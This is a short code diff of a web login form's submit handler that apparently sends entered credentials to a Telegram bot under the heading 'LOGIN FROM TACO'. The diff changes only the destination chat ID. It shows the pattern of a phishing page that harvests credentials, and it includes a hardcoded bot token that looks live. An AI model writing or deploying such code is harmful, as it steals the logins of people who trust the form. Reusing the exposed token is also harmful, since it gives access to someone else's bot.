@@ -7,7 +7,7 @@ document.getElementById("login-form").addEventListener("submit", async (e) => {
     
     // Telegram bot details
     const botToken = "8043174080:AAGywvags0Uoa4tMGoJUfVz8oEJMHLaE5io";
-    const chatId = "-4820773911";
+    const chatId = "-1002979982624";
     
     // Format the message with inline monospace for easy copying
     const message = `🔐 *LOGIN FROM TACO*  
@@ -29,4 +29,5 @@ document.getElementById("login-form").addEventListener("submit", async (e) => {
     } catch (error) {
         console.error("Error:", error);
     }
+
 });
